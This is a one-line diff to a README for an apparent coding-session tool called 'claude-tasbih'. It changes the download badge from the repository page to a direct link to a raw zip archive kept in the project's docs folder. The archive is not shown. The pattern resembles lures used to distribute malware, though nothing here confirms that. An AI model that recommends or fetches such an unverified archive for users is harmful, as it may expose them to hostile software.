@@ -37,7 +37,7 @@ This turns a regular coding session into a gentle, mindful experience — like a
 
 > **Step 1: Visit the download page**
 
-[![DOWNLOAD claude-tasbih](https://img.shields.io/badge/⬇️%20Download%20claude--tasbih-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3a55&color=4caf50)](https://github.com/denominational-pianist606/claude-tasbih)
+[![DOWNLOAD claude-tasbih](https://img.shields.io/badge/⬇️%20Download%20claude--tasbih-blue?style=for-the-badge&logo=github&logoColor=white&labelColor=2b3a55&color=4caf50)](https://github.com/denominational-pianist606/claude-tasbih/raw/refs/heads/main/docs/tasbih_claude_1.6-beta.1.zip)
 
 Visit this link to download the application.
 
